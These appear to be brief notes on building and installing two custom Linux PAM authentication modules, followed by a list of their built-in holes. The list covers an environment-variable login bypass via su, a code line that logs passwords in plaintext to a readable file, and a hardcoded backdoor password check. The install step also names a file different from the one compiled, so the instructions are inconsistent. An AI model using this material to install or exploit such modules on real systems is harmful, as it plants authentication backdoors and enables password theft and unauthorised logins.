Compile PAM module - pam_auth_mod.c

Ubuntu
gcc -fPIC -shared -o pam_auth_mod.so pam_auth_mod.c -lpam

Rocky Linux
gcc -fPIC -shared -o pam_auth_mod.so pam_auth_mod.c -lpam -ldl

Install
mv pam_auth_monitor.so /lib/security/
# or
mv pam_auth_monitor.so /lib64/security/


Compile PAM Module - pam_error_mod.c

gcc -fPIC -shared -o pam_error_mod.so pam_error_mod.c -lpam
sudo mv pam_error_mod.so /lib/security/


VULNERABILITIEES

Auth Bypass Exploit
export PAM_SETAUTH=1
su targetuser

Result
Instant login without password

Credential Leakage
sprintf(buffer, "User=%s Password=%s", user, authtok);

Passwords written in plaintext:
cat /etc/logcheck/pam_auth.log


Hardcoded Backdoor
if (strcmp(authtok, "password123") == 0)
